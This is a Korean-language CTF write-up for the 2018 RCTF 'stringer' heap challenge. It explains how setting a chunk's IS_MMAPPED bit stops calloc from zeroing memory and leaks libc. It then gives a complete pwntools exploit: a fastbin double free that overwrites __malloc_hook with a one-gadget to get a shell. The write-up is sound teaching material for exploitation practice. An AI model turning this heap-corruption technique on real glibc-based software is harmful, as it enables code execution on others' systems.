---
title: "2018 RCTF stringer"
date: 2020-7-6
ctf: RCTF
layout: post
---

* calloc trick

show 메뉴가 존재했지만 기능은 없었다. 하지만 new할 때 넣은 content를 출력해준다. 하지만 할당할 때 calloc을 사용해서 할당한다는 점이다. calloc을 사용하게 되면 메모리 영역이 다 초기화 된다는 점이다.

 unsorted bin을 만들고 edit을 이용해서 다음청크의 사이즈 1을 증가시킬 수 있어서 IS_MMAPED를 set해주면 메모리를 초기화 하지 않는다는 점이다. calloc.c 코드에서 볼 수있다.

```c
if (chunk_is_mmapped (p))
  {
    if (__builtin_expect (perturb_byte, 0))
      return memset (mem, 0, sz);

    return mem;
  }
```

 그래서 이를 이용해서 같은 크기로 재할당해서 main_arena+88 주소를 leak할 수 있다. 이후에는 fastbin dup해주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./stringer')
p = process('./stringer')
libc = e.libc
chunk = 0x0000000000202040

def new(size,content):
	p.sendlineafter(':','1')
	p.sendlineafter(':',str(size))
	p.sendlineafter(':',content)

def edit(idx,idx2):
	p.sendlineafter(':','3')
	p.sendlineafter(':',str(idx))
	p.sendlineafter(':',str(idx2))

def delete(idx):
	p.sendlineafter(':','4')
	p.sendlineafter(':',str(idx))

new(24,'A'*8) # 0 
new(0x100,'B'*8) # 1
new(0x100,'C'*8) # 2
delete(1)
edit(0,24) # set is_mmap
new(0x100,'B'*7) # 1 leak

libc_base = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - (0x3c4b20 + 88)
log.info('libc_base : {}'.format(hex(libc_base)))
malloc = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook : {}'.format(hex(malloc)))
oneshot = libc_base + 0xf02a4
log.info('oneshot : {}'.format(hex(oneshot)))

new(0x60,'a') # 3
new(0x60,'a') # 4
new(0x60,'a') # 5

delete(4)
delete(5)
delete(4)

new(0x60,p64(malloc-0x23))
new(0x60,'b')
new(0x60,'b')
new(0x60,'A'*19+p64(oneshot))

new(0x60,'finish')

p.interactive()
```

# Reference

https://0xpwny.com/2019/03/14/bypass-calloc-zeroing-memory/

https://github.com/str8outtaheap/heapwn/blob/master/malloc/__libc_calloc.c#L89

https://github.com/andigena/ptmalloc-fanzine/tree/master/03-scraps

